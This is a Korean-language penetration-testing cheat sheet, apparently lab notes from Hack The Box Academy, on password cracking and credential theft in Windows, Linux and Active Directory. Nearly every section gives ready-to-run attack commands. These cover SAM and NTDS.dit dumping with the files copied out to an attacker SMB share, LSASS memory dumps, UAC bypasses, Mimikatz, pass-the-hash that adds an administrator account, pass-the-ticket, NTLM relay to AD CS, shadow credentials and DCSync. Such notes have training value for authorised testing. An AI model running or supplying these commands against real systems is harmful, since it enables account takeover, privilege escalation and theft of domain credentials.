<details>
  <summary><strong>Crack Station</strong></summary>

- https://crackstation.net/
- `hashcat`과 `john`을 사용하기 전에 사용해볼 것 .
  
</details>

---
<details>
  <summary><strong>Hash Generation</strong></summary>

평문 패스워드를 다양한 해시 알고리즘으로 변환

```bash
echo -n <password> | sha1sum
echo -n <password> | sha256sum
echo -n <password> | md5sum
```
  
</details>

---
<details>
  <summary><strong>CeWL - Custom Wordlist Generator</strong></summary>

대상 웹사이트를 크롤링하여 커스텀 워드리스트 생성

```bash
cewl -m 2 --with-numbers --lowercase <url>
```
- `-m`: 최소 단어 길이
- `--with-numbers`: 숫자 포함
  
</details>

---
<details>
  <summary><strong>Hashcat</strong></summary>

### 기본 Dictionary Attack
```bash
hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt
```
- `-a 0`: Dictionary attack mode
- `-m 0`: MD5 hash type

### Rule-based Attack
```bash
hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
- `-r`: 룰 파일 적용 (mutation 수행)

### Mask Attack (Brute-force)
```bash
hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
```
- `-a 3`: Mask attack mode
- `?u`: 대문자, `?l`: 소문자, `?d`: 숫자, `?s`: 특수문자

### Custom Rule 생성
```bash
hashcat -r rules cewl.txt --stdout > output
hashcat -a 1 output output --stdout > final
```
- Combinator attack으로 단어 조합 생성
  
</details>

---
<details>
  <summary><strong>OpenSSL Encrypted GZIP Cracking</strong></summary>

암호화된 GZIP 파일 brute-force 복호화

```bash
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
```
- AES-256-CBC 암호화 대상
- 성공 시 자동으로 압축 해제

  
</details>

---
<details>
  <summary><strong>BitLocker Cracking</strong></summary>

### Hash 추출
```bash
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash
cat backup.hash
```
- VHD 파일에서 BitLocker hash 추출

### 마운트 및 복호화
```bash
sudo mkdir -p /media/bitlocker
sudo mkdir -p /media/bitlockermount
sudo losetup -f -P Backup.vhd
sudo losetup -a
sudo kpartx -av /dev/loop0
ls /dev/mapper
sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
cd /media/bitlockermount/
```
- `dislocker`: 복호화된 파일 생성
- `-u`: 복구 패스워드 또는 사용자 패스워드

### 언마운트
```bash
sudo umount /media/bitlockermount
sudo umount /media/bitlocker
```

</details>

---
<details>
  <summary><strong>Default Credentials Search</strong></summary>

제품별 기본 자격증명 검색 도구

```bash
pip3 install defaultcreds-cheat-sheet
creds search linksys
```
- 벤더/제품명으로 기본 크리덴셜 조회
  
</details>

---
<details>
  <summary><strong>Windows SAM/SYSTEM/SECURITY Dumping</strong></summary>

### Registry 덤프
```powershell
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```
- Admin 권한 필요
- SAM: 로컬 계정 해시 저장
- SYSTEM: 암호화 키 포함
- SECURITY: 캐시된 도메인 자격증명

### SMB 서버 설정 (Attacker)
```bash
sudo impacket-smbserver -smb2support CompData /home/ltnbob/Documents/
```
- `CompData`: 공유 이름
- SMBv2 지원 활성화

### 파일 전송 (Victim)
```powershell
move sam.save \\10.10.15.16\CompData
move security.save \\10.10.15.16\CompData
move system.save \\10.10.15.16\CompData
```

### Hash 추출
```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```
- NTLM 해시 및 캐시된 자격증명 추출
  
</details>

---
<details>
  <summary><strong>DCC2 (Domain Cached Credentials) Cracking</strong></summary>

도메인 캐시 자격증명 크래킹 (오프라인 로그인용)

```bash
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```
- `-m 2100`: MS-CacheV2 (DCC2) 형식
- secretsdump 결과에서 추출

  
</details>

---
<details>
  <summary><strong>Remote Hash Dumping</strong></summary>

원격 시스템에서 LSA secrets 및 SAM 해시 덤프

```bash
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```
- `--local-auth`: 로컬 계정 사용
- `--lsa`: LSA secrets 덤프
- `--sam`: SAM database 덤프
  
</details>

---
<details>
  <summary><strong>LSASS Memory Dumping</strong></summary>

### Task Manager (GUI)
```
1. Open Task Manager
2. Select the Processes tab
3. Find and right click the Local Security Authority Process
4. Select Create dump file
```
- GUI 환경에서 간편하게 덤프 생성

### PID 확인
```powershell
# CMD
tasklist /svc

# PowerShell
Get-Process lsass
```

### Rundll32를 이용한 덤프
```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <pid> C:\lsass.dmp full
```
- Windows 내장 DLL 사용 (Living-off-the-Land)
- Admin + SeDebugPrivilege 필요
- AV 우회 가능성 높음

### 덤프 분석
```bash
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```
- 평문 패스워드, NTLM 해시, Kerberos 티켓 추출

</details>

---
<details>
  <summary><strong>Saved Credentials (cmdkey)</strong></summary>

Windows Credential Manager에 저장된 자격증명 확인

```powershell
cmdkey /list
```
- `Interactive`: 대화형 로그온 세션용 자격증명
<img width="567" height="126" alt="image" src="https://github.com/user-attachments/assets/d6cb984e-57e5-4846-8b63-b896908a3aec" />

### 저장된 자격증명으로 프로세스 실행
```powershell
runas /savecred /user:SRV01\mcharles cmd
```
- 패스워드 입력 없이 다른 사용자로 실행

### UAC Bypass
```powershell
# Administrators 그룹 멤버십 확인
whoami /all

# Method 1: fodhelper.exe
reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe

# Method 2: computerdefaults.exe
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
```
- UAC 프롬프트 없이 높은 권한 획득

### Mimikatz로 Credential Manager 덤프
```powershell
mimikatz.exe
privilege::debug
sekurlsa::credman
vault::cred
```
- Credential Manager 및 Windows Vault 데이터 추출
<img width="822" height="359" alt="image" src="https://github.com/user-attachments/assets/cf12ff6c-14ab-4a65-8793-7cdc70c14cf0" />

</details>

---
<details>
  <summary><strong>Username Enumeration</strong></summary>

### Custom Username List 생성
```bash
./username-anarchy -i /home/ltnbob/names.txt
```
- 이름 리스트에서 가능한 username 패턴 생성

### Kerberos Pre-auth를 이용한 Username 검증
```bash
./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
```
- 유효한 사용자 계정 식별 (AS-REQ 요청)
- 인증 실패 시에도 사용자 존재 여부 확인 가능
  
</details>

---
<details>
  <summary><strong>NTDS.dit Dumping</strong></summary>

### 사용자 정보 확인
```powershell
net user <user>
net user <user> /domain
```

> **요구사항**: Administrators 또는 Domain Admins 그룹 멤버십
<img width="955" height="265" alt="image" src="https://github.com/user-attachments/assets/446d1628-350e-4158-84a3-441c2a263655" />

### VSS (Volume Shadow Copy) 생성 및 덤프
```powershell
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
```
- Volume Shadow Copy로 잠긴 파일 복사
- NTDS.dit: AD 데이터베이스 (모든 도메인 해시 포함)

### Hash 추출
```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```
- SYSTEM 하이브로 암호화 키 복호화
- 모든 도메인 사용자 NTLM 해시 추출

### NetExec를 이용한 자동화
```bash
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```
- ntdsutil 모듈로 원격 덤프
  
</details>

---
<details>
  <summary><strong>Password Hunting (Windows)</strong></summary>

시스템 내 저장된 패스워드 검색

### LaZagne
```powershell
start LaZagne.exe all
```
- 브라우저, 이메일, FTP, DB 등 다양한 애플리케이션의 저장된 패스워드 추출

### 파일 내 패스워드 검색
```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```
- `/SIM`: 대소문자 구분 없이 재귀 검색
- 설정 파일 및 스크립트에서 평문 패스워드 탐색

### Snaffler
```powershell
Snaffler.exe -s
```
- 네트워크 공유에서 민감한 파일 자동 검색

### PowerHuntShares
```powershell
Import-Module .\\PowerHuntShares.psm1
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```
- 멀티스레드 SMB 공유 스캔 및 민감 데이터 식별
  
</details>

---
<details>
  <summary><strong>Password Hunting (Linux)</strong></summary>

### 설정 파일 검색
```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
- 일반적인 설정 파일 확장자 검색

### 설정 파일 내 자격증명 검색
```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```
- MySQL/MariaDB 설정 파일에서 자격증명 추출

### 데이터베이스 파일 검색
```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```
- SQLite, SQL 덤프 파일 등 식별

### 사용자 홈 디렉터리 텍스트 파일
```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```
- 확장자 없는 파일 포함 검색

### 스크립트 및 소스코드 검색
```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```
- 하드코딩된 자격증명 탐색

### Cron Jobs 확인
```bash
cat /etc/crontab
ls -la /etc/cron.*/
```
- 자동 실행 스크립트에서 자격증명 노출 가능

### Bash History
```bash
tail -n5 /home/*/.bash*
```
- 명령어 히스토리에서 평문 패스워드 추출

### Log 파일 분석
```bash
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```
- 인증 성공/실패, sudo 명령어 등 보안 이벤트 추출

### Memory Credential Dumping
```bash
sudo python3 mimipenguin.py
sudo python2.7 laZagne.py all
```
- 메모리에서 평문 패스워드 추출 (Linux 버전)

### Firefox 브라우저 자격증명
```bash
ls -l .mozilla/firefox/ | grep default
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
python3.9 firefox_decrypt.py
```
- Firefox 프로필에서 저장된 로그인 정보 복호화

### LaZagne (Linux)
```bash
python3 laZagne.py browsers
```
- 브라우저 저장 패스워드 일괄 추출

### ManSpider - SMB 파일 내용 검색
```bash
docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
```
- SMB 공유의 파일 내용을 검색하여 패스워드 문자열 탐지

### NetExec Spider
```bash
nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw" --smb-timeout 60
```
- `--spider`: SMB 공유 재귀 탐색
- `--content`: 파일 내용 검색
- `--pattern`: 정규식 패턴 매칭
  
</details>

---
<details>
  <summary><strong>Linux Old Passwords</strong></summary>

이전에 사용된 패스워드 해시 확인

```bash
sudo cat /etc/security/opasswd
```
- PAM 모듈로 패스워드 재사용 방지 시 저장
- 과거 패스워드 크래킹으로 현재 패턴 유추 가능

</details>

---
<details>
  <summary><strong>Linux Password Cracking</strong></summary>

### Shadow 파일 백업
```bash
sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak
```

### Unshadow
```bash
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```
- passwd와 shadow 파일 결합하여 John/Hashcat 형식 생성

### Hashcat 크래킹
```bash
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```
- `-m 1800`: SHA-512 (Linux default)
  
</details>

---
<details>
  <summary><strong>Network Traffic Password Hunting</strong></summary>

### PCredz
```bash
git clone https://github.com/lgandx/PCredz
./Pcredz -f demo.pcapng -t -v
```
- PCAP 파일에서 평문 자격증명 추출
- FTP, HTTP, SMTP, IMAP, POP3 등 지원

### Wireshark 분석
- `pcap`, `pcapng` 파일을 Wireshark로 열어 수동 분석
- 필터: `http.request.method == "POST"`, `ftp` 등
  
</details>

---
<details>
  <summary><strong>Pass the Hash (PtH)</strong></summary>

NTLM 해시로 인증 (평문 패스워드 불필요)

### Mimikatz PtH
```powershell
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
- 새 프로세스를 해시 기반 인증으로 시작

### Invoke-TheHash (SMB)
```powershell
cd C:\tools\Invoke-TheHash\
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```
- SMB를 통한 원격 명령 실행

### Invoke-TheHash (WMI)
```powershell
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "<payload>"
```
- WMI를 통한 원격 명령 실행

### Impacket PsExec
```bash
impacket-psexec administrator@10.129.201.126 -hashes 30B3783CE2ABF1AF70F77D0660CF3453
```
- 해시로 인증 후 SYSTEM 권한 쉘 획득

### NetExec Spray
```bash
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```
- 여러 호스트에 동일 해시로 인증 시도

### Evil-WinRM PtH
```bash
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```
- WinRM을 통한 PtH 및 PowerShell Remoting

### RDP PtH (Restricted Admin Mode)
```powershell
# Restricted Admin Mode 활성화 (대상 시스템)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
```bash
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```
- RDP로 해시 기반 인증 (Restricted Admin Mode 필요)

</details>

---
<details>
  <summary><strong>Pass the Ticket (PtT)</strong></summary>

Kerberos TGT/TGS 티켓을 재사용하여 인증

> **요구사항**: Mimikatz/Rubeus는 관리자 권한 필요 (티켓 수집 시)

### Mimikatz - 티켓 수집
```powershell
.\mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```
- 메모리에서 모든 Kerberos 티켓 추출 및 `.kirbi` 파일로 저장

### Rubeus - 티켓 덤프
```powershell
Rubeus.exe dump /nowrap
```
- Base64 인코딩된 티켓 출력

### Rubeus - TGT 요청 및 주입
```powershell
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```
- `/ptt`: Pass-the-Ticket (티켓을 현재 세션에 주입)

### Rubeus - 티켓 주입
```powershell
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
dir \\DC01.inlanefreight.htb\c$
```
- 파일 시스템 접근으로 티켓 유효성 검증

### Mimikatz - 티켓 주입
```powershell
mimikatz.exe
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
dir \\DC01.inlanefreight.htb\c$
```

### PSRemoting with PtT
```powershell
Enter-PSSession -ComputerName DC01
whoami
hostname
```
- 주입된 티켓으로 원격 PowerShell 세션

### Rubeus - 새 로그온 세션 생성
```powershell
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```
- 새 네트워크 전용 로그온 세션에 티켓 주입
- 다른 사용자 티켓과 충돌 방지
  
</details>

---
<details>
  <summary><strong>Pass the Key / OverPass the Hash</strong></summary>

NTLM 해시 또는 AES 키로 Kerberos TGT 요청

### Mimikatz - NTLM/AES 키 추출
```powershell
mimikatz.exe
privilege::debug
sekurlsa::ekeys
```
- 메모리에서 Kerberos 암호화 키(AES256/128, NTLM) 추출
<img width="1123" height="287" alt="image" src="https://github.com/user-attachments/assets/28898ca9-5765-4043-ae18-e47eb247b25e" />

### Mimikatz - OverPass the Hash
```powershell
mimikatz.exe
privilege::debug
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```
- NTLM 해시로 TGT 요청 및 새 프로세스 시작

### Rubeus - AES256으로 TGT 요청
```powershell
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```
- Rubeus는 관리자 권한 불필요 (Mimikatz와의 차이점)
- AES 키 사용 시 더 높은 은닉성

</details>

---
<details>
  <summary><strong>Kerberos Ticket Format Conversion</strong></summary>

### .kirbi를 Base64로 변환
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```
- Rubeus는 Base64 형식 티켓 사용

### Base64 티켓 주입
```powershell
Rubeus.exe ptt /ticket:<base64 format>
```
  
</details>

---
<details>
  <summary><strong>Linux Domain Integration Check</strong></summary>

Linux 시스템의 AD 도메인 가입 여부 확인

### Realm 확인
```bash
realm list
```
- SSSD 또는 Winbind 도메인 정보 출력

### 도메인 통합 서비스 확인
```bash
ps -ef | grep -i "winbind\|sssd"
```
- Winbind: Samba 도메인 통합
- SSSD: System Security Services Daemon

### Keytab 파일 검색
```bash
find / -name *keytab* -ls 2>/dev/null
```
- Kerberos 인증용 키 파일 (서비스 계정 자격증명 포함)

### Cron Jobs 확인
```bash
crontab -l
```
- 자동화된 스크립트에서 keytab 사용 가능

### 도메인 사용자 정보
```bash
id julio@inlanefreight.htb
```
- UID/GID 및 그룹 멤버십 확인
<img width="1164" height="554" alt="image" src="https://github.com/user-attachments/assets/568b191c-fb0a-4737-b7fd-f1669cd370bf" />
  
</details>

---
<details>
  <summary><strong>KeyTab File Exploitation</strong></summary>

### KeyTab 내용 확인
```bash
klist -k -t /opt/specialfiles/carlos.keytab
```
- 저장된 principal 및 암호화 타입 표시

### KeyTab로 인증
```bash
klist
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist
smbclient //dc01/carlos -k -c ls
```
- `-k`: Kerberos 인증
- `-t`: keytab 파일 지정

### KeyTab에서 해시 추출
```bash
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```
- NTLM 해시 추출 후 PtH 가능

### 사용자 전환
```bash
su - carlos@inlanefreight.htb
```
- 추출한 해시 또는 티켓으로 사용자 전환

</details>

---
<details>
  <summary><strong>ccache File Exploitation</strong></summary>

### ccache 파일 확인
```bash
klist
```

### 환경 변수로 ccache 주입
```bash
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist
smbclient //dc01/C$ -k -c ls -no-pass
```
- `KRB5CCNAME`: Kerberos 티켓 캐시 경로

### Proxychains를 통한 원격 실행
```bash
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
proxychains impacket-wmiexec dc01 -k
```
- `-k`: Kerberos 인증 사용

### Evil-WinRM with Kerberos
```bash
sudo apt-get install krb5-user -y
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```
- `/etc/krb5.conf` 설정 필요 (도메인 정보)
<img width="612" height="389" alt="image" src="https://github.com/user-attachments/assets/63821327-613c-4d07-9e13-94bf34d85519" />
  
</details>

---
<details>
  <summary><strong>Ticket Format Conversion</strong></summary>

### ccache to kirbi
```bash
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```
- Linux ccache → Windows kirbi 변환

### Rubeus로 kirbi 주입
```powershell
C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
klist
dir \\dc01\julio
```
  
</details>

---
<details>
  <summary><strong>Linikatz - Linux Mimikatz</strong></summary>

Linux 메모리에서 자격증명 추출

```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
/opt/linikatz.sh
```
- SSSD, Winbind 등에서 평문 패스워드 및 해시 추출
  
</details>

---
<details>
  <summary><strong>AD CS NTLM Relay Attack (ESC8)</strong></summary>

NTLM 인증을 AD CS 웹 인터페이스로 릴레이하여 인증서 발급

### ntlmrelayx 설정
```bash
impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```
- `--adcs`: AD CS 대상
- `--template`: 요청할 인증서 템플릿

### Printer Bug로 인증 트리거
```bash
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
```
- DC 머신 계정의 NTLM 인증을 공격자에게 강제 전송

### 인증서로 TGT 요청
```bash
python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
export KRB5CCNAME=/tmp/dc.ccache
```
- PKINIT (인증서 기반 Kerberos 인증)

### DCSync 공격
```bash
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```
- DC 머신 계정으로 도메인 해시 덤프

  
</details>

---
<details>
  <summary><strong>Shadow Credentials Attack</strong></summary>

msDS-KeyCredentialLink 속성에 인증서 추가하여 PKINIT 사용

### pywhisker로 Shadow Credential 생성
```bash
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
```
- 대상 사용자의 msDS-KeyCredentialLink에 인증서 키 추가
- WriteProperty 권한 필요

### 인증서로 TGT 요청
```bash
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
export KRB5CCNAME=/tmp/jpinkman.ccache
klist
```

### Evil-WinRM 접속
```bash
cat /etc/krb5.conf
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```
- Kerberos 티켓으로 WinRM 인증
<img width="612" height="389" alt="image" src="https://github.com/user-attachments/assets/0e6f5184-851c-460a-a00a-40dd9b3e0495" />
  
</details>

---
<details>
  <summary><strong>KeePass</strong></summary>

### 파일 찾기
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
- C 드라이브 전체에서 `.kdbx` 확장자를 가진 파일을 재귀적으로 검색
- `-ErrorAction SilentlyContinue` 옵션은 접근 권한 오류 메시지를 숨김

### 해시 추출 및 크래킹
```bash
keepass2john Database.kdbx > keepass.hash
```

```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

```
# Master password로 로그인
```

---

## KeePass Dump File Cracking
```bash
python3 poc.py <file.dmp>

# sudo apt install keepassxc
keepassxc <file.kdbx>
```
- https://github.com/matro7sh/keepass-dump-masterkey

## kpcli
```bash
kpcli -kdb=<file.kdbx>

find .

show -f <number>
```

</details>

---
<details>
  <summary><strong>PPK (PuTTY Private Key File) to PEM</strong></summary>

```bash
puttygen <file.ppk> -O private-openssh -o <file.pem>

ssh -i <file.pem> host@local
```
  
</details>

---
<details>
  <summary><strong>pbkdf2(GITEA)</strong></summary>

- `Hashcat`의 `PBKDF2-HMAC-SHA256` 모드(-m 10900)가 `Base64` 형식을 요구
- `username:sha256:iterations:base64_salt:base64_digest`
```bash
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
```

</details>

---
<details>
  <summary><strong>ZipCrypto</strong></summary>

```bash
7z l -slt <zip file>
```
- 압축된 파일의 내용들과 세부 정보 확인.

<br>

```bash
crc32 ~/.bash_logout
```
- `.bash_logout`의 경우 리눅스 설치시 동일하게 설치 됨.
- `crc`값을 비교하여 같은 파일인지 확인할 수 있음.

<br>

```bash
/opt/bkcrack/bkcrack -C uploaded-file-3422.zip -c .bash_logout -P plain.zip -p .bash_logout

/opt/bkcrack/bkcrack -C uploaded-file-3422.zip -k 6230b158 1cf90fe7 97778c9c -U uploaded-file-3422-pass.zip <password>
```
- https://github.com/kimci86/bkcrack
- `.bash_logout`을 `plain.zip`으로 압축하여 진행.
- 발견한 `Key`를 가지고 새로운 암호로 새로운 zip파일을 생성.
  
</details>

---
<details>
  <summary><strong>Encrypted RSA</strong></summary>

<img width="1201" height="109" alt="image" src="https://github.com/user-attachments/assets/5a6f1794-b6c9-41fc-a6ae-0c3a02dedb27" />

- 암호화가 되어있다는 표시.

<br>

```bash
openssl rsa -in private -out id_rsa

ssh -i hype_key_decrypted -o PubkeyAcceptedKeyTypes=+ssh-rsa hype@10.10.10.79
```
- 오래된 SSH의 경우 `ssh-rsa`알고리즘을 활성화해서 접속해야한다.
  
</details>

---
<details>
  <summary><strong>cpassword</strong></summary>

```bash
# pip install gpp-decrypt
gpp-decrypt -f groups.xml
```
  
</details>

---
<details>
  <summary><strong>PFX</strong></summary>

```bash
# PFX 파일 크래킹
pfx2john filename > hash
john hash

# PFX에서 키 추출
openssl pkcs12 -in <pfx file> -nocerts -nodes -out private.key
openssl pkcs12 -in <pfx file> -nokeys -clcerts -out public.key

# SSH 접속
ssh -i <file.pem> host@local

# Evil-WinRM 접속
evil-winrm -i <ip> -c <public key> -k <private key> -S 
```
  
</details>

---
<details>
  <summary><strong>CISCO</strong></summary>

## Configuration
<img width="564" height="637" alt="image" src="https://github.com/user-attachments/assets/71376984-d33a-44b2-8836-5988f58154c5" />

## TYPE 7
- https://github.com/theevilbit/ciscot7
```bash
python3 ciscot7.py -d -p '02375012182C1A1D751618034F36415408'
```

</details>
